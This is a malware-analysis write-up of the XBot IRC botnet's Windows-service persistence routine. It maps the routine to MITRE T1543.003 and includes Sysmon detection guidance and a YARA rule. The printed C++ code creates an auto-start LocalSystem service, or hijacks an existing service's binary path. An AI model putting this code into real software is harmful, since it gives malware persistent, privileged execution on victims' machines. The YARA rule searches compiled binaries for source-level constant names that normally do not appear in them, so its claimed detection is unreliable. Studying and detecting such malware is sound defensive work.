# XBot IRC Botnet - Windows Service Persistence with Modification Fallback
**Repository:** MalwareSourceCode-main  
**File Path:** `Win32/Botnets/Win32.XBot/Win32.XBot/services.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1543.003 - Create or Modify System Process: Windows Service

---

## Overview

The XBot IRC botnet establishes persistence by creating a new Windows Service set to launch automatically at system boot. A key feature of its implementation is a fallback mechanism: if the `CreateService` API call fails because the service name is already in use, the malware attempts to modify the existing service's configuration instead. This "create or modify" logic makes its persistence more resilient, allowing it to hijack or repair service configurations. The service is configured to run as `LocalSystem` with interactive desktop access, granting it high privileges and the ability to perform user-interactive tasks like keylogging.

---

## Code Snippet: Service Creation and Modification Logic

```cpp
bool XCreateService(char *Host, char *ServiceName, char *ServiceDisplayName, char *Path, bool Modify)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	DWORD            dwErrorCode;

	schSCManager = OpenSCManager((Host)?(Host):(NULL), NULL, SC_MANAGER_ALL_ACCESS);
    if (!schSCManager) return false;

	// Attempt to create the service
	schService = CreateService(
		schSCManager, 
		ServiceName, 
		ServiceDisplayName, 
		SERVICE_ALL_ACCESS, 
		SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, 
		SERVICE_AUTO_START, 
		SERVICE_ERROR_IGNORE, 
		Path, 
		NULL, NULL, NULL, NULL, NULL
	);

	if (!schService)
	{
		dwErrorCode = GetLastError();

		// If creation fails because the service already exists, proceed to modify it
		if (dwErrorCode == ERROR_SERVICE_EXISTS)
		{
			if (Modify) // Check if modification is allowed
			{
				schService = OpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
				if (schService)
				{
					// Change the configuration of the existing service to point to the malware's path
					if (!ChangeServiceConfig(
						schService, 
						SERVICE_NO_CHANGE, 
						SERVICE_NO_CHANGE, 
						SERVICE_NO_CHANGE, 
						Path, // Update the binary path
						NULL, NULL, NULL, NULL, NULL, 
						ServiceDisplayName
					))
					{
						CloseServiceHandle(schSCManager);
						CloseServiceHandle(schService);
						return false;
					}
				}
			}
		}
		else
		{
			CloseServiceHandle(schSCManager);
			return false;
		}
	}
    // ... cleanup and return
}
```

**What it does:**  
The function first attempts to create a new Windows service using `CreateService`. The service is configured to auto-start (`SERVICE_AUTO_START`) and run with the ability to interact with the desktop (`SERVICE_INTERACTIVE_PROCESS`). If this call fails with the error `ERROR_SERVICE_EXISTS`, the code checks a boolean `Modify` flag. If true, it opens the existing service and uses `ChangeServiceConfig` to overwrite its binary path, effectively hijacking the service to execute the malware on the next system boot.

**Why it's T1543.003:**  
This code is a direct implementation of the "Create or Modify System Process: Windows Service" technique. It first attempts to **create** a service for persistence. When that fails due to a name collision, it falls back to **modifying** an existing service. This dual-pronged approach makes the persistence mechanism highly robust. By ensuring the service is set to `SERVICE_AUTO_START`, the malware guarantees its execution by the high-privilege Service Control Manager at every system startup.

---

## Detection & Evasion

### Sysmon Telemetry

- **Event ID 12 & 13: Registry Create/Set**: A new service registration creates keys and values under `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`. Monitor for the creation of a new service key, or changes to the `ImagePath` value of an existing service, by an unexpected process.
  - **TargetObject:** `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath`
  - **Details:** The `ImagePath` value will be set to the malware's executable path.

- **Event ID 7: ImageLoad**: The `services.exe` process will load the malware's executable when the service starts. Look for `services.exe` loading unsigned images from unusual locations (e.g., `%TEMP%`, `%APPDATA%`).

- **Windows Security Log Event ID 4697**: A new service was installed. Pay close attention to services installed with the `SERVICE_INTERACTIVE_PROCESS` flag (Type `0x110`), as this is a deprecated and highly suspicious setting.

### YARA Rule

```yara
rule T1543_Persistence_XBot_Service_Create_Modify
{
    meta:
        author = "Vengful"
        description = "Detects strings related to the XBot malware's service creation and modification persistence logic."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1543.003"

    strings:
        // Service creation and management function calls
        $s1 = "CreateServiceA" fullword
        $s2 = "ChangeServiceConfigA" fullword
        $s3 = "OpenServiceA" fullword
        $s4 = "OpenSCManagerA" fullword

        // Key flag for interactive desktop access
        $flag1 = "SERVICE_INTERACTIVE_PROCESS"

        // Error code for checking if service already exists
        $error1 = "ERROR_SERVICE_EXISTS"

    condition:
        uint16(0) == 0x5A4D and // MZ header
        all of ($s*) and
        $flag1 and $error1
}
```
